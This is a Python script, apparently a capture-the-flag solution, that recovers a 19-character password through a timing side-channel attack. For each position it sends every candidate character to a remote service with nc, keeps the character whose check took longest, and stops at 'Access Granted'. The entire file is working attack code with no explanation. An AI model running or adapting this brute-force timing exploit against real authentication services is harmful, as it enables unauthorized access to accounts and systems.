import subprocess

prime = 19

ALL_CHARS = ['a', 'A',
             'b', 'B',
             'c', 'C',
             'd', 'D',
             'e', 'E',
             'f', 'F',
             'g', 'G',
             'h', 'H',
             'i', 'I',
             'j', 'J',
             'k', 'K',
             'l', 'L',
             'm', 'M',
             'n', 'N',
             'o', 'O',
             'p', 'P',
             'q', 'Q',
             'r', 'R',
             's', 'S',
             't', 'T',
             'u', 'U',
             'v', 'V',
             'w', 'W',
             'x', 'X',
             'y', 'Y',
             'z', 'Z',
             '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
             '~', '`', '!', '@', '#', '$', '%', '^', '&', '*', 
             '(', ')', '-', '_', '=', '+', '{', '}', '[', ']', '|', 
             '/', '\\', ':', ';', '"', '\'', '<', '>', ',', '.', '?']

#print(len(ALL_CHARS))

HASH_IDXS = []
for i in range(prime):
    HASH_IDXS.append((7*i+4)%prime)
#print(HASH_IDXS)

TRYPWD = []
TRYPWD.extend(["=" for i in range(prime)])
#print(TRYPWD)

for i in range(prime):
    TIMES = []
    PWD = TRYPWD.copy()
    for C in ALL_CHARS:
        PWD[HASH_IDXS[i]] = C
        PWDINP = "".join(PWD)+"\n"	
        C = subprocess.Popen(["nc","10.21.235.179","5555"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout, stderr = C.communicate(input = PWDINP.encode())
        RESPONSE = stdout.decode()
        TIMES.append(float(((RESPONSE.split("\n")[2]).split("=")[1]).strip()))
        if (i==18 and (RESPONSE.split("\n")[1].strip()) == "Access Granted"):
            break;
    if (i!=18):
        TRYPWD[HASH_IDXS[i]] = ALL_CHARS[TIMES.index(max(TIMES))]
    print(TRYPWD)

print("The Password is: ", "".join(TRYPWD))
        

